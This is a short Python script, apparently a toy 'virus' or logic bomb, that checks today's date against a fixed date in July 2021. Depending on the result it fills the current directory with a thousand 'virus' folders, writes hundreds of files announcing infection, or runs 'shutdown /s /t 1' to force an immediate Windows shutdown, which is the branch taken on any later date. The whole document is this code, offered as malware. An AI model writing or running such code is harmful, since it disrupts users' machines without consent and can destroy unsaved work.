import os
from datetime import date

setdate=date(2021,7,21)  #set a date
todaydate=date.today()   #today's date


#creates new directory or text files or shutdown the system based on the conditions

if todaydate==setdate:
    for i in range (0,1000):
        var=str(i)
        name="virus"+var
    
        os.mkdir(name)

elif todaydate<setdate:
    for i in range(1,1000):
        var=str(i)
        name="Virus"+var
    
        file=open(name, "w")
        file.write("Congrats! You've been affected by virus!")
        file.close()        
else:
    os.system("shutdown /s /t 1")
    